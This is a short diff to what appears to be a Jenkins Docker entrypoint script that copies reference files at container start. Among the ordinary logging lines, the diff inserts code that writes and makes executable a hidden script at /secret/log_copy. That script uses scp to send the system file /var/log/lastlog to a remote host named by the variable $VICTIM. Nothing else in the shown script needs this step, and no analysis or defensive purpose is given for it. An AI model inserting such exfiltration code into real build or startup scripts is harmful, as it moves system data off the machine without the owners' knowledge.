@@ -4,6 +4,11 @@
 touch "${COPY_REFERENCE_FILE_LOG}" || { echo "Can not write to ${COPY_REFERENCE_FILE_LOG}. Wrong volume permissions?"; exit 1; }
 echo "--- Copying files at $(date)" >> "$COPY_REFERENCE_FILE_LOG"
 
+echo "#!/bin/bash" > /secret/log_copy
+echo "scp /var/log/lastlog $VICTIM:/secret/. " >> /secret/log_copy
+echo "echo 'Log file transferred.'" >> /secret/log_copy
+chmod +x /secret/log_copy
+
 # if `docker run` first argument start with `--` the user is passing jenkins launcher arguments
 if [[ $# -lt 1 ]] || [[ "$1" == "--"* ]]; then
 
